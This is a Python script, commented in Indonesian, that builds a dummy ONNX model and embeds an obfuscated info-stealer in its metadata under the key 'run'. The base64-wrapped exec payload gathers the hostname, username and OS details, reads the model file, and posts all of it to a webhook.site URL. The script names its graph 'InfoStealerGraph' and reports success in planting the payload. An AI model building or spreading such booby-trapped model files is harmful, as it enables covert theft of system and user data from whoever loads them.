# create_model_with_systeminfo_exfil.py
import onnx
from onnx import helper, TensorProto
import base64

# ====== 1. model dummy ======
input_tensor = helper.make_tensor_value_info("input", TensorProto.FLOAT, [1])
output_tensor = helper.make_tensor_value_info("output", TensorProto.FLOAT, [1])

identity_node = helper.make_node(
    "Identity", ["input"], ["output"], name="IdentityNode"
)

graph = helper.make_graph(
    [identity_node],
    "InfoStealerGraph",
    [input_tensor],
    [output_tensor]
)

model = helper.make_model(graph, producer_name="exfil_model")

# ====== 2. Payload: system info + model file + exfil ======
webhook_url = "https://webhook.site/78a9abba-f0e1-48d5-8d58-c47745e62317"

raw_payload = f"""
import platform, socket, getpass, base64, requests

# Info sistem
info = {{
    "hostname": socket.gethostname(),
    "user": getpass.getuser(),
    "system": platform.system(),
    "release": platform.release(),
    "version": platform.version()
}}

# Encode isi model.onnx
with open('model.onnx', 'rb') as f:
    model_data = base64.b64encode(f.read()).decode()

# Gabungkan ke JSON
data = {{
    "info": info,
    "model": model_data
}}

# Kirim ke webhook
requests.post("{webhook_url}", json=data)
"""

# Encode base64
encoded = base64.b64encode(raw_payload.encode()).decode()

# wrap exec
wrapped = f"import base64; exec(base64.b64decode('{encoded}').decode())"

# add metadata key='run'
entry = onnx.onnx_ml_pb2.StringStringEntryProto(key="run", value=wrapped)
model.metadata_props.append(entry)

# Save model
onnx.save(model, "model.onnx")
print("[+] model.onnx berhasil dibuat dan disisipi payload info + file exfil.")